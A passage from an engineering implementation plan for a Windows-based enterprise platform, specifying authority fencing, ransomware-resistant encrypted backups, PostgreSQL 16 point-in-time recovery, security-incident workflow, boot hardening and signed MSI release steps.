        Mutation::NonceReuse, Mutation::ChunkReorder,
    ] {
        assert!(envelope.mutated(mutation).decrypt_with_recovery().is_err());
    }
    assert!(envelope.decrypt_as_writer().is_denied());
    assert!(envelope.decrypt_as_target().is_denied());
}
```

- [ ] **Step 2: Confirm failure**

Run: `cargo xtask f57check --task F57-24 --phase pre-red && cargo test -p ep-platform-backup --test epb1_conformance && cargo test -p ep-adapter-backup --test epb1_conformance && cargo test -p ep-testkit --test f57_authority_fencing --test f57_ransomware_recovery --test f57_windows_time --test f57_windows_ipc --test f57_postgres16_recovery --test f57_backup_target --test f57_backup_envelope --test f57_recovery_cut --test f57_recovery_tool_windows --test f57_pg_tls --test f57_rfc3161_signing --test f57_windows_recovery_security --test f57_security_incident --test f57_residency --test f57_successor_ltsc_boundary`

Expected: FAIL because transaction-bound epoch, authenticated Windows pipes, trusted W32Time/residency evidence, the ADR-0021 EPB1 transport envelope, ADR-0024 recovery key envelope, verified recovery cuts/certification, native recovery/TLS helpers, security-incident/successor-LTSC boundaries, RFC3161-stamped MSI and current backup controls are absent.

- [ ] **Step 3: Implement epoch and Windows service identity contract**

```rust
pub struct AuthorityLease {
    pub deployment_id: uuid::Uuid,
    pub epoch: u64,
    pub holder_id: uuid::Uuid,
    pub valid_until: TrustedUtc,
    pub lease_deadline: MonotonicDeadline,
    pub fencing_evidence: Option<EvidenceRef>,
}

pub async fn begin_authority_tx(
    pool: &PgPool,
    expected: AuthorityEpoch,
) -> Result<PgTx, AuthorityError>;
```

`AuthorityLease` can be constructed only from Task 2 `TrustedClockV1`; within a boot, expiry uses `lease_deadline`, while restart invalidates the monotonic lease and requires the signed epoch/checkpoint path to reacquire it. `begin_authority_tx` opens the real SQL transaction, reads/locks the current deployment epoch, compares the server-held expected epoch, sets `SET LOCAL ep.authority_epoch`, and returns the only `PgTx` accepted by Task 6. Database triggers check the transaction-local epoch for every protected write. Epoch is never trusted from a client command. Promotion requires two-person approval and proof the old writer is powered off, storage-fenced or network-fenced. Warm standby is disabled on the P340 and never counts as ransomware backup.

The reserved migration `V20261025093500__platform_ops_create_authority_epochs.sql` is an explicitly aggregate F-57 recovery migration despite its historical slug. It creates the exact current table set `authority_epochs,recovery_cuts,recovery_cut_attachments,backup_targets,backup_topologies,backup_sets,backup_set_objects,backup_set_receipts,backup_checkpoints,backup_key_envelopes,backup_runner_leases,offline_media,offline_media_transitions,backup_quota_reservations,recovery_materials,recovery_material_rotations,recovery_drills,recovery_certifications,recovery_certification_samples,wal_retention_samples` and no compatibility view/table. This one aggregate semantically replaces every `PLATFORM_OPS_RECOVERY_V1` row in the legacy-disposition seed；no old Stage-14 backup table is executable or a second truth.

`authority_epochs` is the single current deployment row plus append-only epoch evidence；all current/control rows use positive `row_version` CAS. `recovery_cuts` and `recovery_cut_attachments` bind deployment、authority epoch、release/config generation、a `VERIFIED` base `backup_sets.id`、base end/minimum recovery LSN、target LSN、immutable attachment ciphertext IDs/digests、Merkle root/count、pin lease and retention deadline；cut plus attachment pins commit atomically with an authority-fenced Task 6 transaction and immutable triggers reject cut mutation or pinned GC. `backup_targets/topologies` are signed-current version rows；`backup_sets` owns the exact set lifecycle and joins one immutable object graph、ADR-0021 cipher-graph digest、ADR-0024 envelope digest and release/config generation. `backup_set_objects` and `backup_set_receipts` are append-only, unique on exact object/chunk/target identity and digest；`backup_checkpoints` is append-only and can reference only a complete receipt set plus an unbroken WAL span and verified recovery cut. `backup_key_envelopes` preserves every predecessor-linked immutable version；there is one current envelope per set and no plaintext key column. `backup_runner_leases` uses authority epoch、holder、trusted/monotonic deadline and CAS；restart invalidates the lease. `offline_media` is the current row, `offline_media_transitions` its append-only typed after-image history, and exactly one medium may be ACTIVE_APPEND for an approved rotation. Quota reservations are current/CAS and settle against immutable object receipts. Recovery material/rotation/drill/certification sample rows are append-only evidence；`recovery_certifications` alone is the current CAS projection and links a new record to its terminal predecessor. `wal_retention_samples` is append-only and checkpoints must prove no required gap.

These are deployment-level control/evidence tables: they intentionally have no `legal_entity_id` and no business RLS, are individually registered by Task 25 in the exact unpoliced-table registry, and are accessible only to the named least-privilege core/backup/recovery service roles. No UI、writer、target or ops-agent receives direct table DML. Current-row mutation, immutable history, exact owner/foreign-key graph, unique current slot, state-transition trigger and caller-owned `PgTx` behavior are implemented in the six `platform_ops` adapters listed in **Files**. FreshPG tests cover missing/extra table, missing registry row, permissive grant, forged foreign key, restart, stale/concurrent CAS, transaction rollback, receipt/checkpoint disagreement and every legacy-name reappearance. `docs/data-dictionary.md` is atomically rebaselined with the same exact set and marks its old Stage-14 §§7.3–7.17 backup prose as historical input only.

Split `crates/adapter/ipc/src/transport.rs` into server/client pipe streams. Create pipes with explicit `SECURITY_ATTRIBUTES`/DACL for the exact service SIDs and reject remote clients. Both peers then verify the other side's SID, process ID, canonical executable path, exact PE SHA-256 digest and Authenticode chain against the active signed release/generation manifest before exchanging an authenticated nonce-bound frame. Chain and CRL material is the pinned signed offline release set—no online `WinVerifyTrust` fallback. Run real `x86_64-pc-windows-msvc` compile and wrong-SID, unsigned/wrong-digest same-publisher process, remote-client, stale-revocation and PID-reuse negatives. Integration gateway stays IPC-only and its SQL-attempt counter is zero.

Implement `WindowsTimeProvider` in `crates/platform/runtime/src/windows_time.rs` and replace the current basic self-check's synthetic/unwired result with W32Time source, maximum offset, last successful sync, stratum/source identity and jump/rollback evidence sampled continuously. `TrustedTimePolicyV1` is referenced by the signed deployment manifest and fixes the exact approved W32Time source set, P340 maximum offset `1_000 ms` and maximum successful-sample age `900 s`; a stricter site policy is allowed. Persist the rollback checkpoint under HDD `Evidence` and seal its digest/monotonic counter in TPM NV. Durations, leases, retry backoff and timeouts use a monotonic clock. Unsynchronized, unavailable, rollback, stale sample or excessive offset blocks high-risk commands, file publication and generation activation. Tests cover reboot, rollback, fast-forward, DST, missing checkpoint and a spoofed/unapproved NTP source.

`ResidencyPolicyV1` fails closed unless authority data, backups, logs, audit, diagnostics/support exports, provider input/output and linkable derivatives all prove processing and persistence in an approved China-mainland region under customer control. Unknown/expired jurisdiction, cross-border endpoint, foreign log/backup/support sink or unmanaged telemetry blocks activation.

`AuthorityCarrierV1` is a strict tagged union with only `CUSTOMER_PHYSICAL_WINDOWS` and `CUSTOMER_IAAS_WINDOWS`. The physical variant exact fields are `kind,hardware_evidence_id,customer_site_id,customer_control_digest,tpm_ek_digest,data_volume_ids,backup_failure_domain_ids,verified_at,expires_at,evidence_digest` and must exact-join Task 7/P340 evidence. The IaaS variant exact fields are `kind,provider_code,provider_root_spki_subject,tenant_id_digest,account_id_digest,region_code,failure_domain_id,instance_id_digest,sku,windows_image_digest,customer_admin_control_digest,vtpm_ek_digest,secure_boot_attestation_digest,authority_volume_id,underlying_media_class,media_evidence_digest,cache_policy,cache_evidence_digest,snapshot_policy,snapshot_evidence_digest,temp_disk_policy,provider_operations_copy_policy,network_control_digest,managed_components,verified_at,expires_at,evidence_digest`。Arrays sort/unique and unknown fields fail. Production requires approved mainland region/customer tenant+admin control, current vTPM/Secure Boot readback, `underlying_media_class=HDD` with provider-root-signed evidence, `cache_policy=NO_CUSTOMER_BYTES` with measured empty/disabled evidence, encrypted/customer-controlled CN-only snapshots, no customer bytes on temp disk/provider operations copies, separate backup/recovery failure domains and `managed_components=[]`. Core PostgreSQL, KMS/secret store, queue, audit, backup, logging or update control cannot be silently replaced by a cloud-managed service；any such component is an explicit failure fixture.

`AuthorityCarrierCertification` is a derived closed result, not a mutable status: priority is `REVOKED` → `EXPIRED` → `TENANT_CONTROL_UNVERIFIED` → `RESIDENCY_UNVERIFIED` → `STORAGE_MEDIA_UNVERIFIED` → `CERTIFIED`. Any missing/unreadable/stale field uses the corresponding unverified result, never a default. Only CERTIFIED may accept real customer data. `t_f57_nfr_009` in `f57_windows_recovery_security.rs` exact-compares both variants, canonicalization and provider-root/tenant/region/vTPM/HDD/cache/snapshot/temp/provider-copy/failure-domain evidence, and rejects ordinary cloud-disk labels, SSD/tiered/unknown media, hidden cache, provider snapshot/admin path, managed PostgreSQL/KMS/queue/log sink, cross-region copy, wrong root, expired evidence and physical/IaaS field mixing. `verify-residency.ps1` and the production certificate persist the exact carrier payload/digest; the container-carrier evidence in Task 14 cannot substitute for authority certification.

`SuccessorLtscBoundaryV1` keeps Windows Server 2022 as the only certified first-release authority, ships an OS-adapter seam, successor probe and signed migration playbook, and rejects any Windows Server 2025/successor "certified" claim until real install, upgrade/parallel migration, restore and rollback evidence exists. A signed production certificate after mainstream support also binds current patch source, accepted risk and migration schedule; extended-support expiry is a hard stop.

`crates/platform/flow::SecurityIncidentStore` is the lifecycle port owner；`apps/ops-agent/src/security_incident.rs` detects/collects evidence only and `apps/core-server/src/platform/security_incidents.rs` is the sole command/query adapter. Store methods accept caller-owned `PgTx` plus expected row version, so transition, typed milestone, affected-subject refs, audit, outbox and command receipt commit once. `V20261025093510__platform_ops_create_security_incidents.sql` independently creates `security_incidents` current rows、append-only transitions、typed milestones、affected deployment/generation/package/SBOM/certificate/key/account/data-scope refs、external evidence/checkpoints、rotation records、customer/regulatory notifications、independent release approvals and source-fact consumption receipts, all with RLS, immutable history, unique source-fact idempotency and CAS constraints. The authority migration `93500` does not hide incident tables.

Implement `SecurityIncidentV1` with the exact Client §8 state enum and allowed edges only: `DETECTED→TRIAGED`、`TRIAGED→CONTAINED|CLOSED_FALSE_POSITIVE`、`CONTAINED→ERADICATING`、`ERADICATING→RECOVERING`、`RECOVERING→RECONCILING`、`RECONCILING→CLOSED`。There is no CANCEL terminal. Gate each edge with persisted typed evidence: DETECTED→TRIAGED requires impact triage plus severity/SLA classification；TRIAGED→CONTAINED requires a committed containment scope, write/network fence and server-external evidence checkpoint；CONTAINED→ERADICATING requires verified containment plus eradication plan；ERADICATING→RECOVERING requires eradication verification and all required session/certificate/key/provider-secret rotations；RECOVERING→RECONCILING requires a verified known-clean recovery point, restored integrity evidence and high-risk writes still fenced；RECONCILING→CLOSED requires business/financial reconciliation, every required customer/regulatory notification, a fresh server-external checkpoint and a different authorized person's release approval before the write fence is lifted. `TRIAGED→CLOSED_FALSE_POSITIVE` alone is allowed for a false positive and requires independent, immutable false-positive basis/evidence. Both closed states are terminal；late contrary evidence creates a new incident with `supersedes_incident_id`, never reopens the old row.

Deployment impact is determined from SBOM plus generation/package digests with `AFFECTED | NOT_AFFECTED | UNKNOWN`; `UNKNOWN` is never green. A compromised authority or newest backup forces containment and older-known-clean selection. Task 16's durable `SupportSessionFailedContainedV1` and Task 22's durable `PortalCredentialReuseDetectedV1` outbox facts are consumed exactly once into an incident or explicit linked triage record；duplicate delivery is idempotent, payload-digest disagreement is contained, and no agent/gateway can suppress the fact. Restart at every state/milestone, concurrent transition, stale version, missing/mismatched evidence, every unlisted edge, both terminal mutations, premature write release, duplicated source fact and crash before/after outbox acknowledgement are mandatory FreshPG cases.

Task 24 appends exactly the 12 `CONTROL/COMMAND` plus four `CONTROL/QUERY` security-incident seed rows whose `owner_task=F57-24` and `introduced_version=1.2.0-f57`. The cumulative Control 1.2 slice is exactly `51/33`; bump `control-center.v1.yaml` from Task 23 `1.1.0-f57` to `1.2.0-f57`, set `x-planned-implementation-tasks` exactly to `[F57-16,F57-23,F57-24]`, and atomically update the README machine row and authority semantic row. Every introduced branch carries `x-f57-owner-task: F57-24` and exact seed payload/result/error `$ref`, CAS, audience and `operation_error_code=NONE`; OpenAPI、Control Rust Task 6 registration and generated TypeScript exact-equal the cumulative seed slice. `IncidentDesk` shows the real state, missing milestone, impact trinary result, external checkpoint, notification/reconciliation and release-approval evidence；it cannot paint `UNKNOWN` green or directly mutate incident state. Missing/extra/future-owner/unknown variants or fields, stale version, schema/CAS/audience mismatch, client-asserted severity downgrade, omitted milestone and direct ops-agent route fail contract and architecture tests.

- [ ] **Step 4: Implement three-role backup control, BitLocker and physical boot gates**

```powershell
$requiredEvidence = @(
  "CONTINUOUS_APPEND_ONLY",
  "OFFLINE_ROTATION",
  "RECOVERY_MATERIAL",
  "WRITER_DELETE_DENIED",
  "RETENTION_CUSTODIAN_INDEPENDENT",
  "RECOVERY_CUSTODIAN_INDEPENDENT",
  "RECOVERY_DOMAIN_SEPARATION",
  "CLEAN_SERVER_RESTORE",
  "MEASURED_RPO_RTO"
)
Assert-EvidenceSet -Required $requiredEvidence -EvidenceRoot $DataRoot\evidence
```

Implement `BackupTopologyV1` with exact role principals, target/media IDs, capacity, custody, failure domain, retention and signed checkpoint chain. `BackupCheckpointSignerPort` accepts only a canonical checkpoint whose target receipts, object digests, PostgreSQL backup manifest/WAL span, attachment set and malware/logic-pollution verdict all validate. Its non-exportable TPM/HSM key and service identity are unavailable to the production writer; the signer cannot create, enumerate, read or delete backup content. Multi-generation restore selection verifies the signer chain before choosing a point. The production writer can append and read back only the exact object it just created for checksum verification; it cannot enumerate history, overwrite, delete, take ownership, change ACL or change retention. The retention custodian can extend/sign retention but cannot shorten it except through an independent two-person, two-stage disposal approval after the protected period; it cannot create or restore backups. The recovery custodian can restore with independent keys but cannot mutate source retention. Concrete adapters enforce real target controls and receipts; integration tests exercise exact-object readback, denied list/overwrite/delete/take-ownership/ACL changes, retention-shortening rejection, signer-key denial and recovery access with real target identities, not only mocks.

The certified continuous carrier is `HTTPS_APPEND_ONLY_V1` to the separate `backup-target` Windows service over mutually authenticated TLS with an exact writer certificate principal; a Windows virtual service account or machine account alone is never treated as off-server isolation. Before network or offline-media output, the writer encrypts every fixed-size chunk with [ADR-0021](../../adr/ADR-0021-epb1-backup-envelope.md) `EPB1` AES-256-GCM；the binary layout, field offsets/endian、136-byte header、record bounds、8-MiB chunking、set-global ordinal/nonce、AAD and `Epb1CipherGraphV1` are imported byte-for-byte and cannot be restated as a looser semantic subset here. ADR-0014 `EPC1` remains closed to FIELD/ATTACHMENT/ARCHIVE and is never used for backups. Each backup set has one backup-specific DEK, and its recovery material is encoded only as ADR-0024 `BackupKeyEnvelopeV1`: closed algorithms/canonical encoding/AAD, three independently held PIV-encrypted Shamir shares, exact two-of-three recovery, KAT, rotation and loss/revocation rules. It is never wrapped to the daily writer or target. Business names and plaintext digests are excluded from transport object keys and public receipts；the signed manifest/checkpoint carries only the required ciphertext evidence and exact recovery graph. The target and daily writer cannot enumerate or decrypt history；only the independent recovery ceremony can decrypt.

Task 24 activates the `BackupRecoveryDomainManifestPayloadV1` wrapper over Task 2's shared recovery-domain descriptor implementation. Before the first set or any rotation, it creates/loads the strict `<ValidatedDataRoot>/RecoveryDomains/Backup/current.v1.json` plus immutable history, verifies its compile-time/embedded `purpose="EP-F57-BACKUP-RECOVERY-DOMAIN-MANIFEST-V1"` under the independent backup-recovery-domain roster, exact three ordered descriptors、recipient-set digest、validity、predecessor and server-external revocation checkpoint, and proves zero token/custodian/SPKI/signer overlap with APPLICATION. `BackupKeyEnvelopeV1.recovery_domain_manifest_digest` and `recipient_set_digest` bind the locked verified payload；writer cannot follow a later current pointer during the run. Rotation is append-only old+1/CAS and retains every referenced history generation. Wrong wrapper/domain/purpose/signer、registry swap、expired/revoked PIV、jump/rollback、missing history or any separation failure blocks backup certification and exercises both public payload types against `f57-recovery-domain-manifest.schema.json`.

The target runs on a different host/failure domain and a certified HDD-only encrypted NTFS data volume with SSD cache disabled/proven empty, uses conditional `CREATE_NEW`, takes server ownership, applies role DACLs after close and issues ciphertext-digest-bound receipts. The writer's one-use readback token addresses only the just-created exact ciphertext object; listing, overwrite, rename, delete, ACL/owner and retention calls are denied. `backup-target` has no SQL and its installer refuses the authority host/deployment/volume identity. Tests capture target-side bytes and canary-search all storage/logs to prove no plaintext, then decrypt only through the independent recovery identity. Authentication failures, interrupted chunk upload, retry/resume, duplicate idempotency keys, nonce reuse, chunk reorder/duplication and AAD field mutation have conformance tests; a partial object can be finalized only after full digest verification.

The offline class contains at least two distinct `media_id` values, with exactly one connected during an approved rotation. The media graph is exactly the client/lifecycle contract: `BLANK → ENROLLED → ACTIVE_APPEND → VERIFIED_DISCONNECTED`; `VERIFIED_DISCONNECTED → ROTATION_DUE → ACTIVE_APPEND` only while capacity/health/retention still pass; and `ACTIVE_APPEND → SEALED_VERIFIED → RETIRED_PENDING_DISPOSAL → DESTROYED`, with no return from `SEALED_VERIFIED` to writable. A destroyed `media_id` is terminal; approved/verified physical reuse starts as a new `media_id`. Every deployment/target has signed object, byte, rate, concurrency and partial-object quotas plus an independently protected emergency reserve; quota or reserve exhaustion fails new backup admission visibly without deleting or shortening protected history. Partial-upload reclamation uses an independent least-privilege identity and cannot enumerate/read completed sets.

`media_state.rs` and the FreshPG repository suite contain named exact tests `offline_media_every_allowed_edge_is_executable`、`offline_media_every_unlisted_edge_is_rejected`、`offline_media_terminal_edges_are_immutable`、`sealed_media_can_never_become_writable`、`rotation_requires_capacity_health_retention_and_single_connected_medium`、`destroyed_physical_reuse_requires_new_media_id`、`offline_media_restart_reconstructs_from_history` and `offline_media_concurrent_cas_has_one_winner`。Each allowed edge proves the required signed evidence and exact current/history cardinality；a looped happy path cannot satisfy the gate.

Every continuous target, every offline medium and the clean recovery host must each have available capacity at least `actual_recoverable_set + encryption_checksum_restore_workspace + measured_30_day_P95_growth`; the continuous target additionally fits every generation required by the signed retention policy. The effective ransomware retention is at least `max(site_legal_retention, 90 days, 2 * measured_detection_lag_p99 + clean_restore_validation_window, 2 * offline_rotation_interval)`, and a verified offline set may be no older than seven days; a stricter signed site policy may reduce age or lengthen retention, never the reverse. Missing detection-lag evidence, insufficient capacity or retention-custodian shortening blocks certification. Restore tests poison the newest set and recover from multiple older verified generations. Clean restore recovers the exact deployment manifest/trust root/revocation checkpoint, pre-DB vault, database, WAL-consistent attachments, generation, packages and audit checkpoints before reconciliation. RPO/RTO bind to hardware, data size and generation; no universal four-hour value is accepted.

`RecoveryCertificationPolicyV1` uses the exact Client §10.5 graph: first full clean restore/reconciliation moves `UNVERIFIED→INITIAL_RESTORE_VERIFIED`；a second consecutive success for the same profile moves to `CANDIDATE_MEASURED`；a third within the rolling prior 90 days, with no failed/unresolved drill, moves to `CERTIFIED` for at most 90 days. Only `INITIAL_RESTORE_VERIFIED→CANDIDATE_MEASURED|INVALIDATED`、`CANDIDATE_MEASURED→CERTIFIED|INVALIDATED` and `CERTIFIED→EXPIRED|INVALIDATED` are additionally allowed. A failure before the first successful restore leaves the record UNVERIFIED and appends failure evidence. After INITIAL_RESTORE_VERIFIED/CANDIDATE_MEASURED/CERTIFIED, any drill failure or hardware/storage topology、PostgreSQL build/extension、key/custodian、retention、data-size class、release/config generation or recovery-procedure change moves to INVALIDATED；only a CERTIFIED record reaching `valid_until` without recertification moves to EXPIRED. EXPIRED/INVALIDATED are terminal；recertification creates a new ID linked to its predecessor and starts at UNVERIFIED with three new consecutive successes. UI/export/API must distinguish initial verification, candidate measurement, certified, expired and invalidated states and never upgrade a candidate value into a promise.

`certification.rs` and the FreshPG suite contain named exact tests `recovery_certification_every_allowed_edge_is_executable`、`recovery_certification_every_unlisted_edge_is_rejected`、`recovery_certification_terminal_edges_are_immutable`、`first_failure_keeps_unverified_and_appends_evidence`、`three_consecutive_profile_equal_successes_are_required`、`rolling_ninety_day_window_and_valid_until_are_exact`、`every_registered_profile_change_invalidates`、`expiry_applies_only_to_certified`、`recertification_requires_new_predecessor_linked_id`、`recovery_certification_restart_reconstructs_from_samples` and `recovery_certification_concurrent_cas_has_one_winner`。The tests enumerate each registered profile-change dimension and reject sample reuse、cross-profile success、failed/unresolved drill omission and any in-place resurrection of EXPIRED/INVALIDATED.

The OS SSD uses the Task 2 certified `TPM_ONLY_UNATTENDED` or `TPM_PIN_ATTENDED` mode; the HDD may auto-unlock only after trusted boot. SSD contains only OS-managed sealed protector metadata as the narrow exception—never application master keys or customer secrets. OS/data volume recovery keys are independently held offline under separate two-person custody records and remain separate from application-vault and backup recovery domains. Installation and every boot verify Secure Boot, PCR binding, TPM state, protector exact set and auto-unlock. Task 24 must re-read and jointly validate the Task 2 `RecoveryDomainSeparationEvidenceV1` against the actual two BitLocker protectors, the three application PIV tokens/custodians, the three different backup PIV tokens/custodians and backup signer/writer/recovery identities；a per-domain self-test cannot substitute. Tests cover every cross-domain key/token/holder/recipient/envelope/custody-record reuse, TPM/OS-disk loss, theft of one recovery key, unattended UPS restart only in TPM-only mode and separately measured attended PIN-mode RTO.

Set a two-person-held UEFI administrator password, disable external boot/PXE, and read back exact Secure Boot, TPM-clear and boot-order policy. Intel AMT is unprovisioned/disabled when unused; if a site explicitly enables it, certification requires a separate management network, independent credentials, TLS trust and firmware evidence. Require chassis lock/tamper evidence and controlled-room evidence. USB/removable media is deny by default, AutoRun is disabled and composite HID/NIC/boot-class devices are rejected. A signed offline-rotation window binds one disk's media ID, hardware serial, volume GUID, BitLocker protector and backup manifest, verifies it, safely ejects it, revokes access and records proof of physical disconnection; cloned-ID and BadUSB fixtures fail.

- [ ] **Step 5: Implement the pinned PostgreSQL 16 and base-backup/WAL/PITR contract**

`installer/windows/postgresql16.lock.json` is strict and signed with the release: it pins exact PostgreSQL 16 minor/build, offline package SHA-256, Authenticode signer, SBOM digest, `initdb` locale/encoding and the exact bundled extension set. `install-postgres16.ps1` refuses an unpinned package, signer, downgrade or incompatible data format and creates only the dedicated non-interactive `NT SERVICE\ep-postgres16` SCM identity. `configure-postgres16.ps1` routes PGDATA, tablespaces, WAL, temp, server logs and archive staging through Task 2 HDD dispositions with final-handle/ACL verification; no credential, temp or log fallback reaches a service profile or SSD.

Generate exact `postgresql.conf`/`pg_hba.conf`: loopback-only `listen_addresses`, deny-default firewall, TLS on loopback, SCRAM-SHA-256 for the allowlisted database principals, no `trust`/external subnet, data checksums enabled at `initdb`, and `fsync=on`, `full_page_writes=on`, `synchronous_commit=on`, `wal_level=replica`, `archive_mode=on`. PostgreSQL TLS cert, encrypted PKCS#8 PEM key, CA/CRL bundle and passphrase envelope live only under the HDD `Secrets\PostgresTls` disposition with final-handle checks and ACLs for `SYSTEM`, the controlled security operator and exact PostgreSQL service SID. `postgresql16-tls-policy.json` binds their digests/volume IDs, certificate SPKI/SAN/validity, key algorithm and rotation generation. Configuration fixes `ssl=on`, `ssl_cert_file`, `ssl_key_file`, `ssl_ca_file`, `ssl_crl_file`, `ssl_passphrase_command='C:/Program Files/EnterprisePlatform/pg-passphrase-helper.exe'` and `ssl_passphrase_command_supports_reload=on`; every HBA host row is `hostssl` plus SCRAM and channel-binding policy.

`pg-passphrase-helper` has no network/database dependency and no general secret API. Its signed policy binds deployment, PostgreSQL service SID, exact parent PE digest, helper PE digest, HDD key path/digest and pre-DB secret reference. It verifies its parent process and inherited anonymous output pipe, uses the Task 2 TPM operational recipient to unseal only that call-scoped passphrase, writes it once to the inherited pipe, then zeroizes; it rejects passphrase/key data in argv, environment, ordinary files, logs and dumps. Missing TPM/vault, wrong parent/SID/digest, unencrypted or SSD PEM, permissive ACL, key/cert mismatch, stale CRL and replay all prevent PostgreSQL start. Rotation stages a new encrypted key/cert/envelope on HDD, verifies it, atomically switches the signed policy, reloads and proves old-key retirement. Clean recovery uses two-of-three `recovery-tool` material to recreate the envelope and rewrap it to the new host's operational TPM before PostgreSQL starts.

The signed `archive_command` writes each WAL segment by `CREATE_NEW` to HDD staging and removes it only after a verified server-external receipt. The verifier checks server binary/version/hash, service SID, locale/extensions, TLS/helper configuration, all durability settings, checksums, final volume IDs, ACLs and an actual flush/power-loss recovery; patch or major upgrade requires a new signed lock and restore rehearsal, never in-place silent drift.

`Postgres16BackupSource` first completes `pg_basebackup` with streamed WAL and a SHA-256 backup manifest, encrypts/uploads it, and requires successful `pg_verifybackup`. It derives `base_recovery_floor = max(backup_end_lsn, pg_controldata.minRecoveryPoint)`. Only then does it briefly close the Task 6 business-write gate and, in one authority-fenced PostgreSQL transaction, capture the current signed generation and `target_lsn`, snapshot the exact immutable attachment ciphertext references/digests, compute their Merkle root, insert `RecoveryCutV1` plus per-object pin/retention leases, and require `target_lsn >= base_recovery_floor`; failure rolls the whole cut back. After commit the gate reopens, PostgreSQL switches WAL, and the backup worker proves an unbroken archived span through `target_lsn`, uploads every cut attachment ciphertext and receives exact target receipts. `BackupCheckpointSignerPort` signs the cut only after independently verifying the base manifest/`pg_verifybackup`, LSN floor/span, generation, immutable cut row, attachment Merkle/count, pins/retention and ciphertext receipts.

Restore installs the same pinned engine on a clean Windows Server, verifies/decrypts the base set, supplies the exact `restore_command` and `recovery.signal`, recovers to the signed `target_lsn`, and materializes exactly the cut attachment set. Changes after the cut create new versions and never alter its Merkle root; GC cannot delete any pinned ciphertext until every cut/checkpoint/retention lease is independently released. Tests cover target LSN below backup end or `minRecoveryPoint`, WAL gaps, post-cut reference changes, attempted pinned-object GC, missing/mismatched ciphertext receipt, reordered/duplicate chunks, interrupted resume, poisoned newest backup, older-generation selection, wrong engine minor, wrong locale/extension and `pg_verifybackup` failure.

Run: `cargo test -p ep-platform-backup --test epb1_conformance --test recovery_cut && cargo test -p ep-adapter-backup --test epb1_conformance --test postgres16_pitr --test recovery_cut && cargo test -p pg-passphrase-helper --test pre_db_tls`

Expected: PASS for strict EPB1 wire/AAD/nonce/order/length and recovery-only decryption conformance, strict lock/TLS/helper parsing, verified-base-before-cut ordering, atomic generation/LSN/attachment pins, encrypted base/WAL state machine, floor/gap/post-cut/GC/receipt/retry negatives and restore-plan construction. The real PowerShell/engine proof waits until Step 6 has signed all artifacts.

- [ ] **Step 6: Build MSVC/MSI, sign first, then enforce AllSigned**

Task 24 has a long-lived physical certification carrier, so its ordering is stricter than the ordinary checklist presentation. Complete Steps 1–5 as the local candidate suite, use the closed Step 9 roster to create the clean Task 24 candidate commit, and prove the global clean-tree conditions **before** any Step 6 signing、Step 7 installation/soak/recovery or Step 8 formal lane. Steps 6–8 must all bind that same `candidate_commit_id` and `repository_tree_sha256`；a code、dependency、lockfile、policy、installer、configuration or test change creates a new candidate and invalidates every later Task 24 artifact. Step 9 therefore records the already-created candidate roster and is not a second post-evidence commit.

On a Windows Server runner build `cargo build --workspace --release --target x86_64-pc-windows-msvc`, including `recovery-tool` and `pg-passphrase-helper`, then `dotnet build installer/windows/EnterprisePlatform.wixproj -c Release`. The MSI installs native SCM services with distinct virtual accounts, bounded Job Objects, WDAC policy, deny-default firewall and local PostgreSQL binding; it installs `recovery-tool` only as an on-demand two-person recovery executable and the passphrase helper only for the PostgreSQL service. Both PE digests/signers are in the release manifest, MSI component table, WDAC allowlist and SBOM; neither can be replaced by a script or unsigned utility.

`installer/windows/rfc3161-tsa-policy.json` is strict signed configuration binding the customer-approved internal RFC3161 HTTPS origin, SPKI, TSA signer token, policy OID, offline chain/full-CRL bundle digest, maximum timestamp skew and Task 24 trusted-time policy. `scripts/windows/sign-artifacts.ps1` must call that internal TSA for every EXE/DLL/MSI/PowerShell Authenticode signature; no public Internet TSA is used. If the TSA, trusted time, chain or current CRL is unavailable, production signing fails and emits no releasable artifact—there is no unsigned or signing-time-only fallback. `verify-rfc3161-timestamp.ps1` and `verify-authenticode.ps1` validate the RFC3161 token, message imprint, allowed policy/EKU/signer/SPKI, pinned offline chain/CRL, `genTime` against trusted time and artifact digest. Expired/revoked/wrong-TSA, stale CRL, future/past skew and token replay fixtures fail.

The Windows signing stage runs in a customer-approved isolated network with egress limited to the internal TSA. After verification it exports only signed artifacts plus signed/digest-bound evidence into `target/f57-ci-evidence/windows-authority`; the Rust aggregation stage is offline and never contacts the TSA. `docs/ci-pipeline.md`, the workflow and pipeline TSV/scripts freeze this two-stage handoff. Only after Authenticode and RFC3161 verification may install/certification commands use `-ExecutionPolicy AllSigned`.

Rebaseline `xtask/src/reproduce.rs`, `sign.rs` and `codecheck.rs` from musl/OCI/Podman/systemd assumptions to deterministic MSVC/MSI/Authenticode/RFC3161/SBOM evidence. Rebaseline `.github/workflows/ci.yml`, pipeline TSV/scripts and `docs/ci-pipeline.md` to four signed lanes: Windows Server authority/MSVC/MSI plus isolated internal-TSA signing, macOS/Xcode for macOS+iOS, Android SDK/NDK, and an offline Rust evidence aggregator that validates all lane signatures/digests. No Linux production-release lane remains active.

- [ ] **Step 7: Install pinned PostgreSQL and run Windows/P340 production and recovery gates**

Run on the target server, after Step 6 signature verification: `powershell -NoProfile -ExecutionPolicy AllSigned -File scripts/windows/verify-rfc3161-timestamp.ps1 -ArtifactRoot target/release-package && powershell -NoProfile -ExecutionPolicy AllSigned -File scripts/windows/install-postgres16.ps1 -LockFile installer/windows/postgresql16.lock.json && powershell -NoProfile -ExecutionPolicy AllSigned -File scripts/windows/verify-postgres16.ps1 && powershell -NoProfile -ExecutionPolicy AllSigned -File scripts/windows/verify-postgres16-tls.ps1 && powershell -NoProfile -ExecutionPolicy AllSigned -File scripts/windows/test-postgres16-pitr.ps1`

Expected: PASS only after valid internal-TSA RFC3161 tokens, a clean pinned install, encrypted HDD-only PostgreSQL TLS material, service-bound pre-DB passphrase unseal, all PostgreSQL customer-bearing paths on the HDD, valid checksums/settings, verified-base-before-cut ordering, an unbroken application-encrypted base/WAL chain, signed `RecoveryCutV1`, `pg_verifybackup` success and a reconciled PITR restore with its exact attachment set.

Run on the target server: `powershell -NoProfile -ExecutionPolicy AllSigned -File scripts/windows/verify-residency.ps1 && powershell -NoProfile -ExecutionPolicy AllSigned -File scripts/windows/verify-successor-ltsc-boundary.ps1 && powershell -NoProfile -ExecutionPolicy AllSigned -File scripts/windows/run-p340-certification.ps1`

